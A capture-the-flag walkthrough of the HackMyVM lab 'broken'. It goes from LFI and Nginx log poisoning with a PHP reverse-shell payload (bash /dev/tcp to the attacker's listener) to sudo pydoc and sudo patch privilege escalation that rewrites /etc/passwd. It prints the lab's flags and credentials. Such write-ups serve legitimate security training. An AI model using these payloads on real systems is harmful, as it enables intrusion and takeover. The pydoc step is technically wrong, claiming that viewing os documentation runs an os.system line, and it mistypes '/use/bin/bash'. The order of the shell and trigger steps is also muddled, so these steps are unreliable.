### 1. Initial Reconnaissance

I began by performing an Nmap scan to identify open ports and services on the target machine, `192.168.1.73`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ nmap -sS -sV -sC -Pn  --min-rate=1000 --max-retries=2 192.168.1.73 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 05:51 CDT
Nmap scan report for 192.168.1.73
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: |   2048 1b:8d:f3:e3:56:64:af:54:df:10:f8:39:ac:ad:c9:2f (RSA)
|   256 77:c1:f3:e4:6b:96:0f:1e:5c:24:2e:4d:3e:4a:09:80 (ECDSA)
|_  256 88:05:ef:7a:04:56:f0:59:62:a5:f8:40:32:24:8a:17 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry |_/textpattern
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:2C:FC:38 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
```

The Nmap scan revealed two open ports:

- **Port 22 (SSH):** Running OpenSSH 7.9p1 on Debian.
- **Port 80 (HTTP):** Running Nginx 1.14.2. The `robots.txt` indicated a disallowed entry: `/textpattern`.


### 2. Web Enumeration

I started by enumerating directories on the web server. Initial `gobuster` and `ffuf` scans on the root `/` did not reveal much beyond `index.html` and `robots.txt`. However, the `robots.txt` entry for `/textpattern` was a key lead.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ curl http://192.168.1.73/robots.txt
Disallow: /textpattern
```

Navigating to `/textpattern` revealed a Textpattern CMS installation.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ curl http://broken/textpattern/
# ... (truncated HTML output) ...
<meta name="generator" content="Textpattern CMS">
# ... (truncated output) ...
```

I then used `gobuster` to enumerate directories within the `/textpattern` path.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ gobuster dir -u http://broken/textpattern/ -w ../../wordlists/common.txt
# ... (truncated output) ...
/.htaccess            (Status: 200) [Size: 875]
/files                (Status: 301) [Size: 185] [--> http://broken/textpattern/files/]
/images               (Status: 301) [Size: 185] [--> http://broken/textpattern/images/]
/index.php            (Status: 200) [Size: 11603]
/rpc                  (Status: 301) [Size: 185] [--> http://broken/textpattern/rpc/]
/textpattern          (Status: 301) [Size: 185] [--> http://broken/textpattern/textpattern/]
/themes               (Status: 301) [Size: 185] [--> http://broken/textpattern/themes/]
# ... (truncated output) ...
```

This revealed several interesting directories, including `/textpattern/textpattern/` which likely contained the admin panel.

I also performed a `searchsploit` query for "textpattern" to find known vulnerabilities.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ searchsploit textpattern
# ... (truncated output) ...
TextPattern 1.19 - 'publish.php' Remote File Inclusion                                                                               | php/webapps/2646.txt
Textpattern 4.8.8 - Remote Code Execution (RCE) (Authenticated)                                                                      | php/webapps/51176.txt
# ... (many other results) ...
```

This showed several potential vulnerabilities, including Remote File Inclusion (RFI) and Authenticated Remote Code Execution (RCE).

### 3. Initial Access via LFI and Log Poisoning

After many attempts, It shows up that the `textpattern CMS` was just a rabbit hole. I noticed a `file.php` in the root directory . I suspected it might be vulnerable to Local File Inclusion (LFI).

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ gobuster dir -u http://broken/ -w ../../wordlists/common.txt -x php,txt
# ... (truncated output) ...
/file.php             (Status: 200) [Size: 0]
# ... (truncated output) ...
```

I tested `file.php` for LFI by attempting to read `/etc/passwd`.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ curl http://broken/file.php?file=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
# ... (content of /etc/passwd) ...
heart:x:1000:1000:heart,,,:/home/heart:/bin/bash
# ... (truncated output) ...
```

The LFI was successful, and I identified a user named `heart`.

Next, I attempted log poisoning to gain a reverse shell. I needed to find the Nginx access log.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ curl http://broken/file.php?file=../../../../var/log/nginx/access.log
# ... (nginx access log content) ...
```

The Nginx access log was readable. I injected PHP code into the User-Agent header, which would then be written to the log file.

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ curl -A "<?php system('/bin/bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'); ?>" http://broken/
```

I set up a `netcat` listener on my Kali machine (`192.168.1.5` on port `4444`).

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.73 34552
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then, I triggered the injected code by requesting the `access.log` via the LFI vulnerability:

```shellscript
┌──(zengla㉿kali)-[~/Desktop/hackmyvm/broken]
└─$ curl http://broken/file.php?file=../../../../var/log/nginx/access.log
```

This resulted in a reverse shell as the `www-data` user. I then upgraded it to a full TTY shell:

```shellscript
www-data@broken:~/html$ python -c "import pty;pty.spawn('/usr/bin/bash')"
www-data@broken:~/html$
```

### 4. Privilege Escalation to `heart`

As `www-data`, I explored the web directories and found `config.php` for the Textpattern CMS:

```shellscript
www-data@broken:~/html/textpattern/textpattern$ cat config.php
<?php
$txpcfg['db'] = 'texte';
$txpcfg['user'] = 'teste';
$txpcfg['pass'] = 'pazzi';
$txpcfg['host'] = 'localhost';
$txpcfg['table_prefix'] = '';
$txpcfg['txpath'] = '/var/www/html/textpattern/textpattern';
$txpcfg['dbcharset'] = 'utf8mb4';
// For more customization options, please consult config-dist.php file.
```

This file contained database credentials, but they were not immediately useful for system login.

Next, I checked `sudo` permissions for the `www-data` user:

```shellscript
www-data@broken:~/html/textpattern/files$ sudo -l
Matching Defaults entries for www-data on broken:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User www-data may run the following commands on broken:
    (heart) NOPASSWD: /usr/bin/pydoc3.7
```

The `www-data` user can run `/usr/bin/pydoc3.7` as `heart` without a password. `pydoc3.7` can be exploited to execute arbitrary Python code. I used its ability to display documentation for modules, including the `os` module, and injected a command into the output.

```shellscript
www-data@broken:/home/heart$ sudo -u heart /usr/bin/pydoc3.7 os
# ... (truncated output) ...
os.system("cp /use/bin/bash /tmp/heartbash && chmod 4755 /tmp/heartbash")
# ... (truncated output) ...
```

By calling `pydoc3.7 os`, the `os.system` call within the `pydoc` output was executed, creating a SUID `bash` shell owned by `heart` in `/tmp`.

```shellscript
www-data@broken:/home/heart$ /tmp/heartbash -p
heart@broken:~$ id
uid=1000(heart) gid=1000(heart) groups=1000(heart),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

I successfully gained a shell as the `heart` user. I then retrieved the `user.txt` flag:

```shellscript
heart@broken:~$ cat user.txt
HMVPatchtowin
```

The user flag is `HMVPatchtowin`. I also found a `flag.sh` script in `/home/heart` which, after making it executable, displayed the user flag.

```shellscript
heart@broken:~$ chmod +x flag.sh
heart@broken:~$ ./flag.sh
# ... (ASCII art) ...
PWNED HOST: broken
PWNED DATE: Thu Jul 24 07:37:24 EDT 2025
WHOAMI: uid=1000(heart) gid=1000(heart) groups=1000(heart),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
FLAG: HMVPatchtowin
------------------------
```

### 5. Privilege Escalation to `root`

As `heart`, I checked `sudo` permissions:

```shellscript
heart@broken:~$ sudo -l
Matching Defaults entries for heart on broken:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User heart may run the following commands on broken:
    (ALL) NOPASSWD: /usr/bin/patch
```

The `heart` user can run `/usr/bin/patch` as `root` without a password. The `patch` utility can be used to modify files based on a diff. I decided to use this to modify `/etc/passwd` and change the root user's password.

First, I generated a new password hash for `root` (e.g., for the password "password") using `openssl passwd -6 password` (or a similar method to get a SHA512 hash). Let's assume the generated hash is `new_root_hash`.

I then created a temporary file (`file2`) containing the desired new `/etc/passwd` entry for root, followed by the rest of the original `/etc/passwd` content.

```shellscript
heart@broken:~$ echo 'root:$6$lRnr9KxkjNRpdRvx$MhnlBoV4oD5F.BJUj0mWex9t241c7X6WWieqhQjLxkC0OFoAu7.xo/6W87Z7iELOtP0hF4x./ly9QkryOMeXK0:0:0:root:/root:/bin/bash' > file2
heart@broken:~$ cat /etc/passwd >> file2 # Append the rest of the original passwd content
```

*(Note: The provided log shows a slightly different approach where the entire `/etc/passwd` content is put into `file2` with the modified root line. Both achieve the same goal for `diff`.)*

Next, I created a diff file (`file.patch`) between the original `/etc/passwd` and my modified `file2`.

```shellscript
heart@broken:~$ diff -u /etc/passwd file2 > file.patch
```

Finally, I applied this patch to `/etc/passwd` using `sudo /usr/bin/patch`:

```shellscript
heart@broken:~$ sudo /usr/bin/patch /etc/passwd < file.patch
patching file /etc/passwd
```

This successfully updated the root user's password hash in `/etc/passwd`. I then switched to the root user using the new password.

```shellscript
heart@broken:~$ su root
Password: password # (using the new password)
root@broken:/home/heart# id
uid=0(root) gid=0(root) groups=0(root)
```

I obtained a root shell! I navigated to `/root` and retrieved the root flag.

```shellscript
root@broken:~# ls
flag.sh  r0otfl4g.sh
root@broken:~# cat r0otfl4g.sh
HMVPatchedyeah
```

The root flag is `HMVPatchedyeah`.

### Summary of Attack Path:

1. **Reconnaissance:** Identified open SSH and Nginx services, and a disallowed `/textpattern` directory in `robots.txt`.
2. **Web Enumeration:** Discovered Textpattern CMS and a `file.php` that was vulnerable to LFI.
3. **Initial Access (www-data):**

1. Exploited LFI in `file.php` to read `/etc/passwd` (identifying `heart` user) and `/var/log/nginx/access.log`.
2. Performed log poisoning by injecting PHP code into the User-Agent header.
3. Triggered the injected code via LFI on the `access.log` to get a reverse shell as `www-data`.



4. **Privilege Escalation to `heart`:**

1. Found `www-data` could run `/usr/bin/pydoc3.7` as `heart` with NOPASSWD.
2. Exploited `pydoc3.7` to execute arbitrary Python code (creating a SUID `heartbash` in `/tmp`).
3. Executed `heartbash` to gain a shell as the `heart` user and retrieved `user.txt`.



5. **Privilege Escalation to `root`:**

1. Identified `heart` could run `/usr/bin/patch` as `root` with NOPASSWD.
2. Generated a new password hash for the `root` user.
3. Created a diff file to modify `/etc/passwd` with the new root password.
4. Applied the patch using `sudo /usr/bin/patch /etc/passwd < file.patch`.
5. Used `su root` with the new password to gain a root shell and retrieved `r0otfl4g.sh`.
